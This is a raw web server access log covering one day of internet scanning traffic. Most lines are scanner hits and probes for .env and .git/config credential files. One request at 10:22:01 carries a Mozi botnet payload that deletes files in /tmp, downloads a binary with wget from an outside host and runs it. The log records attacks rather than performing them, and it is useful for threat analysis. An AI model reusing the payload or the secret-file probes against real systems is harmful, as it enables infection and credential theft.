103.99.2.56 - - [21/Nov/2025:05:28:43 +0800] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
27.148.196.43 - - [21/Nov/2025:05:33:29 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Android 14; Mobile; rv:128.0) Gecko/128.0 Firefox/128.0"
205.210.31.13 - - [21/Nov/2025:06:07:56 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03{\x89\x8A\xB0\x94#_\xD9\xFE\xFF\x8C\xFC\xBF\xF7\x91}u\xAC\xE0G\x0C\xED1\xEC\x807\x0B\x82-\xB7K\xF3 \xC9\xF7\x89o\x08\xBC\x22\x1E\x12]\x1D\x83bu\x1D\x93\xAF\xFDe\x5C\xC3\xEB\xC6\x95\x05\xF0yv\x9C\x09\xCA\xAE\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
205.210.31.13 - - [21/Nov/2025:06:07:56 +0800] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03S\xE2i\xF3m\x84\x15\x04\x88\x07\xBB\xEC\xF7\xE7\xE1\xF4/\xE9rEM\x0F\xDD&\xDB\x18\x9E\xF3\x01\x0E\x1F\x8D\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
165.232.83.65 - - [21/Nov/2025:06:16:51 +0800] "GET /backend/.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.142.209.120 - - [21/Nov/2025:06:20:28 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
94.26.88.18 - - [21/Nov/2025:06:21:21 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
91.232.238.112 - - [21/Nov/2025:06:31:57 +0800] "GET / HTTP/1.0" 200 3958 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
205.210.31.87 - - [21/Nov/2025:06:35:09 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
193.142.147.209 - - [21/Nov/2025:06:56:47 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
176.65.148.169 - - [21/Nov/2025:07:03:26 +0800] "GET / HTTP/1.1" 200 3958 "-" "Linux Gnu (cow)"
205.210.31.204 - - [21/Nov/2025:07:07:17 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
103.203.57.3 - - [21/Nov/2025:07:26:26 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 zgrab/0.x"
192.159.99.180 - - [21/Nov/2025:07:57:16 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello World"
185.242.226.113 - - [21/Nov/2025:08:02:42 +0800] "\x16\x03\x01\x00\x8C\x01\x00\x00\x88\x03\x03h3Kc\x9B\xD8\xE5\xEB{\xC8\xC0\x0B\xC4\x04\xC4Q\xA3\x08h\xAC\xAD\xBA0\xC2\xDF\xA1C\x5C\x0F\xD0\x8F3\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
45.153.34.74 - - [21/Nov/2025:08:13:46 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0"
111.7.96.148 - - [21/Nov/2025:08:50:37 +0800] "GET / HTTP/1.1" 200 3958 "-" "curl/7.64.1"
123.160.221.131 - - [21/Nov/2025:08:51:13 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
123.160.221.133 - - [21/Nov/2025:08:51:23 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
123.160.221.133 - - [21/Nov/2025:08:51:23 +0800] "GET /script.js HTTP/1.1" 200 22403 "http://120.55.251.144/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
123.160.221.133 - - [21/Nov/2025:08:51:23 +0800] "GET /1.js HTTP/1.1" 200 21615 "http://120.55.251.144/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
123.160.221.131 - - [21/Nov/2025:08:51:32 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
5.187.35.21 - - [21/Nov/2025:09:10:54 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello World/1.0"
162.216.150.82 - - [21/Nov/2025:09:12:39 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
64.62.197.47 - - [21/Nov/2025:09:30:01 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03o\x12^/g\xD4\xBD!c+\xF1\x92x\xFB" 400 157 "-" "-"
79.124.49.214 - - [21/Nov/2025:09:38:37 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
209.38.201.154 - - [21/Nov/2025:09:56:43 +0800] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
193.142.147.209 - - [21/Nov/2025:10:06:29 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
45.230.66.124 - - [21/Nov/2025:10:22:01 +0800] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.230.66.124:10113/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 153 "-" "Hello, world"
167.99.178.131 - - [21/Nov/2025:10:57:57 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
167.99.178.131 - - [21/Nov/2025:10:57:57 +0800] "GET /.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
20.64.105.133 - - [21/Nov/2025:11:11:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 zgrab/0.x"
91.207.211.45 - - [21/Nov/2025:11:33:01 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
49.248.192.204 - - [21/Nov/2025:11:56:29 +0800] "GET /www/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
49.248.192.204 - - [21/Nov/2025:11:56:29 +0800] "GET /frontend/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
49.248.192.204 - - [21/Nov/2025:11:56:29 +0800] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
49.248.192.204 - - [21/Nov/2025:11:56:32 +0800] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
198.235.24.161 - - [21/Nov/2025:11:59:46 +0800] "GET / HTTP/1.0" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
34.52.204.70 - - [21/Nov/2025:12:18:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "python-requests/2.32.5"
176.65.148.169 - - [21/Nov/2025:13:23:16 +0800] "GET / HTTP/1.1" 200 3958 "-" "Linux Gnu (cow)"
193.142.147.209 - - [21/Nov/2025:13:23:45 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /laravel/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /admin/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /api/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /backend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /html/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /public/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /app/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /frontend/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /backend/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /www/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /frontend/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /admin/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /api/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /app/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /.env.local HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /laravel/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /config/.git/config HTTP/1.1" 404 153 "-" "Mozilla/5.0"
103.78.247.150 - - [21/Nov/2025:13:35:29 +0800] "GET /config/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"
64.62.156.80 - - [21/Nov/2025:13:46:48 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
64.62.156.80 - - [21/Nov/2025:13:48:03 +0800] "GET /webui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.899 Yowser/2.5  Safari/537.36"
64.62.156.82 - - [21/Nov/2025:13:49:54 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
64.62.156.80 - - [21/Nov/2025:13:50:17 +0800] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
198.235.24.146 - - [21/Nov/2025:14:05:00 +0800] "GET / HTTP/1.1" 200 3958 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
78.153.140.176 - - [21/Nov/2025:14:05:55 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; NP08; MAAU; rv:11.0) like Gecko"
172.237.111.170 - - [21/Nov/2025:14:44:18 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xBBz\x04J\x8Dj\x96C\x1D\xFCgq\x19\xDE4\xF3\xDB\xDD\xA9R\xB6[\x9C\x1F" 400 157 "-" "-"
172.237.111.170 - - [21/Nov/2025:14:44:18 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
147.185.132.243 - - [21/Nov/2025:14:51:39 +0800] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x7Ff\xC0\x80\xA5" 400 157 "-" "-"
147.185.132.243 - - [21/Nov/2025:14:51:39 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAB\x96\xCB9[\x8CC\xB1\xD6\xF9\xF9N\xD0\xE5}\x88\xC0\xDFR?y\x9C\xDA\xE3\x16>\xA3\xB9\xBD)\xE6I D.\x0F\x00-_\x8B>\xC2\x02\xF9\xD8\xDCwR\xCF)B\x17||-\xB617\xF0\x0BJ\x91\x86\xDA\x09\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:15:02:08 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [21/Nov/2025:15:03:55 +0800] "GET / HTTP/1.0" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 OPR/63.0.3368.35"
157.230.29.20 - - [21/Nov/2025:15:14:18 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.177 - - [21/Nov/2025:15:16:56 +0800] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E230 Safari/601.1"
78.153.140.177 - - [21/Nov/2025:15:16:56 +0800] "GET /docs/.env.local HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
78.153.140.177 - - [21/Nov/2025:15:16:57 +0800] "GET /lib/python/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67"
78.153.140.177 - - [21/Nov/2025:15:16:59 +0800] "GET /dashboard/.env~ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-R530U Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.177 - - [21/Nov/2025:15:17:01 +0800] "GET /k8s/secrets.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; WFJWAE Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.177 - - [21/Nov/2025:15:17:03 +0800] "GET /lara/.env.local HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1"
78.153.140.177 - - [21/Nov/2025:15:17:04 +0800] "GET /data/config.env HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; EIE10;ENUSWOL)"
78.153.140.177 - - [21/Nov/2025:15:17:04 +0800] "GET /js/envConfig.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WebCruiser/3.5)"
78.153.140.177 - - [21/Nov/2025:15:17:06 +0800] "GET /js/.env.example HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8; TD_LCK_V80_01)"
78.153.140.177 - - [21/Nov/2025:15:17:06 +0800] "GET /node/.env.local HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)"
78.153.140.177 - - [21/Nov/2025:15:17:08 +0800] "GET /docker/dev/.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47"
78.153.140.177 - - [21/Nov/2025:15:17:08 +0800] "GET /dev/.env.config HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20061201 Firefox/2.0.0.2"
78.153.140.177 - - [21/Nov/2025:15:17:09 +0800] "GET /data/konfig.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 5.1.1; A571VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36"
78.153.140.177 - - [21/Nov/2025:15:17:09 +0800] "GET /nextjs/env.yaml HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; Sprint:PPC-6700; PPC; 240x320)"
78.153.140.177 - - [21/Nov/2025:15:17:10 +0800] "GET /laravel/env.yml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
78.153.140.177 - - [21/Nov/2025:15:17:12 +0800] "GET /nextjs/env.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b3) Gecko/20090407 Firefox/3.1b3"
78.153.140.177 - - [21/Nov/2025:15:17:12 +0800] "GET /nextjs-app/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0"
78.153.140.177 - - [21/Nov/2025:15:17:14 +0800] "GET /env_settings.py HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17"
78.153.140.177 - - [21/Nov/2025:15:17:14 +0800] "GET /docs/.env.admin HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
78.153.140.177 - - [21/Nov/2025:15:17:15 +0800] "GET /docs/.env.token HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; BRI/2)"
78.153.140.177 - - [21/Nov/2025:15:17:15 +0800] "GET /database/.env.1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
78.153.140.177 - - [21/Nov/2025:15:17:16 +0800] "GET /database/.env.2 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0"
78.153.140.177 - - [21/Nov/2025:15:17:17 +0800] "GET /live/.env.local HTTP/1.1" 404 555 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0)"
78.153.140.177 - - [21/Nov/2025:15:17:58 +0800] "GET /demo/.env.local HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
109.71.254.225 - - [21/Nov/2025:15:40:43 +0800] "CONNECT 5.199.162.32:2255 HTTP/1.1" 400 157 "-" "-"
79.124.49.214 - - [21/Nov/2025:15:46:13 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
93.174.93.12 - - [21/Nov/2025:16:04:25 +0800] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:16:05:34 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [21/Nov/2025:16:41:42 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [21/Nov/2025:16:48:14 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.187.35.21 - admin [21/Nov/2025:16:59:32 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:33 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:33 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:34 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:34 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:34 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
5.187.35.21 - admin [21/Nov/2025:16:59:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozila/5.0"
3.130.96.91 - - [21/Nov/2025:17:00:30 +0800] "GET / HTTP/1.1" 200 3958 "-" "cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.130.96.91 - - [21/Nov/2025:17:01:02 +0800] "GET / HTTP/1.1" 200 3958 "-" "cypex.ai/scanning Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.130.96.91 - - [21/Nov/2025:17:02:13 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03u\xC6\x98\xFE2\xA9\x8D\x08\xFD?\x1C9C$\x0C" 400 157 "-" "-"
3.130.96.91 - - [21/Nov/2025:17:02:17 +0800] "SSH-2.0-Go" 400 157 "-" "-"
3.130.96.91 - - [21/Nov/2025:17:05:35 +0800] "" 400 0 "-" "-"
157.230.29.20 - - [21/Nov/2025:17:28:55 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.113 - - [21/Nov/2025:17:44:37 +0800] "\x16\x03\x01\x00\x8C\x01\x00\x00\x88\x03\x03@M+\x05\xB0\xEC\x00\xB3~\xD8\x07w5\x8A\xD0\xA0" 400 157 "-" "-"
112.74.38.239 - - [21/Nov/2025:17:45:04 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 zgrab/0.x"
157.230.29.20 - - [21/Nov/2025:18:06:35 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
157.230.29.20 - - [21/Nov/2025:19:02:33 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.18 - - [21/Nov/2025:19:12:58 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
83.142.209.193 - - [21/Nov/2025:19:13:01 +0800] "GET / HTTP/1.1" 200 3958 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:18 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:19 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:19 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:20 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:21 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:21 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:21 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
36.255.98.221 - - [21/Nov/2025:19:29:22 +0800] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:19:39:44 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.147.209 - - [21/Nov/2025:20:00:28 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
157.230.29.20 - - [21/Nov/2025:20:17:01 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
142.93.3.4 - - [21/Nov/2025:20:47:51 +0800] "\x00\x0E8\x8C\x95\x91\xEC\xC7cB\xAB\x00\x00\x00\x00\x00" 400 157 "-" "-"
157.230.29.20 - - [21/Nov/2025:21:01:21 +0800] "GET / HTTP/1.1" 200 3958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [21/Nov/2025:21:08:40 +0800] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
87.121.84.30 - - [21/Nov/2025:21:13:25 +0800] "\x05\x02\x00\x02" 400 157 "-" "-"
